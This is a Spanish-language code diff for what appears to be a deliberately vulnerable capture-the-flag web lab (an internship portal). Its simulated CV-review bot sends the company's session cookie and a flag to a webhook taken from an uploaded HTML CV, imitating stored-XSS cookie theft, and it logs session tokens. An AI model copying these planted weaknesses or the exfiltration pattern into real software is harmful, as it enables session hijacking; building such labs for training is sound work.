@@ -174,6 +174,8 @@ def init_db():
         db.hset('email_to_key', 'rrhh@securelog.com', 'company:3')
 
     # Sincronizar datos de empresas (por si ya existian sin api_key/sector/telefono)
+    # Asegurar que company:1 tenga el rol correcto
+    db.hset('company:1', 'role', 'company')
     db.hset('company:1', 'api_key', 'tc_prod_FLAG{session_hijacked}_v2')
     db.hset('company:1', 'sector', 'Tecnologia')
     db.hset('company:1', 'contact_phone', '+57 604 555 0101')
@@ -485,7 +487,27 @@ def get_current_user():
     user_json = db.get(f'session:{session_token}')
     if not user_json:
         return None
-    return json.loads(user_json)
+    try:
+        return json.loads(user_json)
+    except:
+        return None
+
+
+def redirect_by_role(user):
+    """Redirige al usuario a su dashboard correspondiente según su rol.
+    Importante para seguridad: si se roba una cookie, el usuario será redirigido
+    automáticamente a su dashboard correcto según su rol real."""
+    if not user:
+        return redirect(url_for('index'))
+    role = user.get('role', 'student')
+    routes = {
+        'student': 'student_dashboard',
+        'company': 'company_dashboard',
+        'coordinator': 'coordinator_dashboard',
+        'admin': 'admin_dashboard',
+    }
+    dashboard_route = routes.get(role, 'student_dashboard')
+    return redirect(url_for(dashboard_route))
 
 
 def get_admin_user():
@@ -783,8 +805,9 @@ def logout():
 @login_required
 def student_dashboard():
     user = get_current_user()
-    if user.get('role') == 'company':
-        return redirect(url_for('company_dashboard'))
+    # Validar que el usuario sea estudiante, si no, redirigir a su dashboard correspondiente
+    if user.get('role') != 'student':
+        return redirect_by_role(user)
     # Cargar ofertas activas
     offers = []
     for key in db.keys('offer:*'):
@@ -993,45 +1016,66 @@ def process_cv(file_url, filename):
     """Proceso automático que simula la revisión del CV por parte del sistema (empresa abre el CV).
     file_url: URL de Cloudinary o ruta local."""
     company = db.hgetall('company:1')
-    if company:
-        bot_session = secrets.token_hex(32)
-        company['user_key'] = 'company:1'
-        db.set(f'session:{bot_session}', json.dumps(company))
+    if not company:
+        log_entry(f"ERROR: company:1 no encontrada en Redis")
+        return
+    
+    # Verificar que company:1 tenga el rol correcto antes de crear la sesión
+    if company.get('role') != 'company':
+        log_entry(f"ADVERTENCIA: company:1 tiene rol incorrecto: {company.get('role')}, corrigiendo a 'company'")
+        db.hset('company:1', 'role', 'company')
+        company = db.hgetall('company:1')  # Re-obtener después de corregir
+    
+    bot_session = secrets.token_hex(32)
+    # Crear sesión con datos explícitos de empresa, asegurando el rol correcto
+    company_data = {
+        'id': company.get('id', '1'),
+        'name': company.get('name', 'TechCorp SA'),
+        'email': company.get('email', 'empresa@techcorp.com'),
+        'role': 'company',  # FORZAR rol de empresa explícitamente
+        'sector': company.get('sector', 'Tecnologia'),
+        'api_key': company.get('api_key', ''),
+        'contact_phone': company.get('contact_phone', ''),
+        'user_key': 'company:1',
+    }
+    # Guardar sesión con datos explícitos de empresa
+    db.set(f'session:{bot_session}', json.dumps(company_data))
+    log_entry(f"Sesión de bot creada para empresa: role={company_data.get('role')}, id={company_data.get('id')}, email={company_data.get('email')}, token={bot_session[:16]}...")
 
-        review_id = str(db.incr('counter:review') or 1)
-        db.hmset(f'review:{review_id}', {
-            'id': review_id,
-            'filename': filename,
-            'file_url': file_url,
-            'status': 'processed',
-            'reviewer': 'system_bot',
-            'session_token': bot_session,
-            'review_note': 'Archivo procesado correctamente. Ref: FLAG{stored_xss_persisted}',
-            'processed_at': datetime.now().isoformat(),
-        })
+    review_id = str(db.incr('counter:review') or 1)
+    db.hmset(f'review:{review_id}', {
+        'id': review_id,
+        'filename': filename,
+        'file_url': file_url,
+        'status': 'processed',
+        'reviewer': 'system_bot',
+        'session_token': bot_session,
+        'review_note': 'Archivo procesado correctamente. Ref: FLAG{stored_xss_persisted}',
+        'processed_at': datetime.now().isoformat(),
+    })
 
-        log_entry(f"CV revisado automáticamente — Sesión del bot: {bot_session} — Archivo: {filename} — URL: {file_url}")
+    log_entry(f"CV revisado automáticamente — Sesión del bot: {bot_session} — Archivo: {filename} — URL: {file_url}")
 
-        # Buscar el public_id de Cloudinary en Redis (si existe)
-        cloudinary_public_id = None
-        for key in db.keys('student:*'):
-            user = db.hgetall(key)
-            if user.get('cv_filename') == filename:
-                cloudinary_public_id = user.get('cv_cloudinary_id')
-                break
+    # Buscar el public_id de Cloudinary en Redis (si existe)
+    cloudinary_public_id = None
+    for key in db.keys('student:*'):
+        user = db.hgetall(key)
+        if user.get('cv_filename') == filename:
+            cloudinary_public_id = user.get('cv_cloudinary_id')
+            break
 
-        # Simular que la empresa abrió el CV: si el archivo es HTML con webhook, enviar la cookie de la empresa
-        webhook = _extract_webhook_from_html(file_url, cloudinary_public_id)
-        log_entry(f"Webhook extraído del CV: {webhook if webhook else 'No encontrado'}")
-        if webhook:
-            flag_act2 = 'FLAG{stored_xss_persisted}'
-            cookie_value = f"session_token={bot_session}"
-            exfil_url = f"{webhook.rstrip('/')}?c={quote(cookie_value)}&flag={quote(flag_act2)}"
-            try:
-                req = Request(exfil_url, headers={'User-Agent': 'Mozilla/5.0 (compatible; InternLink/1.0)'})
-                urlopen(req, timeout=5)
-            except (URLError, OSError):
-                pass
+    # Simular que la empresa abrió el CV: si el archivo es HTML con webhook, enviar la cookie de la empresa
+    webhook = _extract_webhook_from_html(file_url, cloudinary_public_id)
+    log_entry(f"Webhook extraído del CV: {webhook if webhook else 'No encontrado'}")
+    if webhook:
+        flag_act2 = 'FLAG{stored_xss_persisted}'
+        cookie_value = f"session_token={bot_session}"
+        exfil_url = f"{webhook.rstrip('/')}?c={quote(cookie_value)}&flag={quote(flag_act2)}"
+        try:
+            req = Request(exfil_url, headers={'User-Agent': 'Mozilla/5.0 (compatible; InternLink/1.0)'})
+            urlopen(req, timeout=5)
+        except (URLError, OSError):
+            pass
 
 
 @app.route('/view-cv/<filename>')
@@ -1171,8 +1215,9 @@ def get_offers():
 @login_required
 def company_dashboard():
     user = get_current_user()
+    # Validar que el usuario sea empresa, si no, redirigir a su dashboard correspondiente
     if user.get('role') != 'company':
-        return redirect(url_for('index'))
+        return redirect_by_role(user)
 
     # Actualizar usuario con datos frescos de Redis (api_key, sector, teléfono) por si la sesión es antigua
     user_key = user.get('user_key') or f"company:{user.get('id')}"
@@ -1270,8 +1315,19 @@ def create_offer():
 @login_required
 def coordinator_dashboard():
     user = get_current_user()
+    # Validar que el usuario sea coordinador, si no, redirigir a su dashboard correspondiente
     if user.get('role') != 'coordinator':
-        return redirect(url_for('index'))
+        return redirect_by_role(user)
+    
+    # Verificar si tiene token de admin válido (importante para el flujo del lab)
+    admin_user = get_admin_user()
+    admin_message = None
+    if admin_user:
+        admin_message = {
+            'text': 'Detectamos que tienes acceso de administrador. Tu panel de administración está disponible en:',
+            'dashboard_url': url_for('admin_dashboard'),
+            'dashboard_name': '/dashboard/admin'
+        }
 
     # Avisos del sistema
     notices = []
@@ -1287,7 +1343,7 @@ def coordinator_dashboard():
         'interns': len(db.keys('intern:*')),
     }
 
-    return render_template('coordinator_dashboard.html', user=user, notices=notices, stats=stats)
+    return render_template('coordinator_dashboard.html', user=user, notices=notices, stats=stats, admin_message=admin_message)
 
 
 @app.route('/exports/candidates')
